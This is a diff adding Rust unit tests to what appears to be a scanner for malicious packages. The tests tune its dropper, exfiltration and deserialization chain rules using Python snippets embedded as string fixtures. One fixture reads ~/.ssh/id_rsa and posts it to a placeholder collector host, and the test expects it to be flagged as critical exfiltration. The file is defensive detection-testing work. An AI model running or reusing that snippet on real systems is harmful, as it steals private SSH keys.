@@ -2509,6 +2509,58 @@ mod reconcile {
         ));
     }
 
+    /// Downloaded *data* handed to a local script as input is not a dropper:
+    /// the launch runs `helper_script`, and `data` is only its stdin. The
+    /// launch sink links through a file the download wrote, never through an
+    /// assigned value or a response handle (verifier finding: this linked
+    /// before, at High).
+    #[test]
+    fn dropper_chain_ignores_downloaded_data_passed_to_a_script() {
+        let data = "import requests, subprocess, sys, json\n\
+            \n\
+            data = requests.get('https://api.example.com/jobs').json()\n\
+            for job in data:\n\
+            \x20   print(job)\n\
+            \n\
+            proc = subprocess.run([sys.executable, helper_script],\n\
+            \x20                     input=json.dumps(data), text=True)\n";
+        assert!(fires("run.py", data, "NET-001"));
+        assert!(fires("run.py", data, "CODE-RUNFILE-001"));
+        assert_eq!(chained("run.py", data, "DROPPER-CHAIN-001"), None);
+        let handle = "with urllib.request.urlopen(JOBS) as response:\n\
+            \x20   jobs = response.read()\n\
+            subprocess.run([sys.executable, helper_script], input=response.read())\n";
+        assert_eq!(chained("run.py", handle, "DROPPER-CHAIN-001"), None);
+    }
+
+    /// A login helper that opens a credential file for *writing* and then
+    /// calls the auth endpoint writes the response into the file: the data
+    /// flows network → file. Binding the write handle made this an
+    /// EXFIL-CHAIN-001 Critical (verifier finding); reading the same file and
+    /// posting it is still the chain.
+    #[test]
+    fn a_credential_file_written_from_a_response_is_not_exfiltration() {
+        let login = "import os, requests\n\
+            \n\
+            def login(user, password):\n\
+            \x20   with open(os.path.expanduser('~/.netrc'), 'w') as netrc_file:\n\
+            \x20       resp = requests.post('https://api.example.com/login', json={'u': user, 'p': password})\n\
+            \x20       netrc_file.write('machine api.example.com login ' + user + ' password ' + resp.json()['token'])\n";
+        assert!(scan("login.py", login)
+            .iter()
+            .any(|f| f.rule.starts_with("CRED-") && f.line == Some(4)));
+        assert_eq!(chained("login.py", login, "EXFIL-CHAIN-001"), None);
+        let send = "import os, requests\n\
+            \n\
+            def send():\n\
+            \x20   with open(os.path.expanduser('~/.ssh/id_rsa')) as keyfile:\n\
+            \x20       requests.post('https://collector.example.net/k', data=keyfile.read())\n";
+        assert_eq!(
+            chained("send.py", send, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+    }
+
     #[test]
     fn launch_and_download_observations_stay_low_or_medium() {
         for launch in [
@@ -2584,6 +2636,25 @@ mod reconcile {
         // A bundled JSON table is not a pickle.
         let table = "path = os.path.join(os.path.dirname(__file__), \"data.json\")";
         assert!(!fires("pkg/__init__.py", table, "CODE-MODEL-001"));
+    }
+
+    /// A package that ships a scikit-learn model or a pickled lookup table and
+    /// loads it with joblib or pickle does the only thing those formats allow;
+    /// only `torch.load(..., weights_only=False)` — the safe loader turned off —
+    /// is the chain's sink (verifier finding: joblib and pickle were sinks).
+    #[test]
+    fn bundled_joblib_or_pickle_load_is_not_the_chain() {
+        let joblib_model = "import joblib, pkg_resources\n\
+            model = joblib.load(pkg_resources.resource_filename('clf', 'data/model.joblib'))\n";
+        assert!(fires("clf/clf.py", joblib_model, "CODE-MODEL-001"));
+        assert_eq!(chained("clf/clf.py", joblib_model, "DESER-CHAIN-001"), None);
+        let table = "import os, pickle\n\
+            def load_states():\n\
+            \x20   with open(os.path.join(os.path.dirname(__file__), 'states.pkl'), 'rb') as pkl_file:\n\
+            \x20       return pickle.load(pkl_file)\n";
+        assert!(fires("states/states.py", table, "CODE-MODEL-001"));
+        assert!(fires("states/states.py", table, "CODE-004"));
+        assert_eq!(chained("states/states.py", table, "DESER-CHAIN-001"), None);
     }
 
     // -- install- and import-time network ----------------------------------
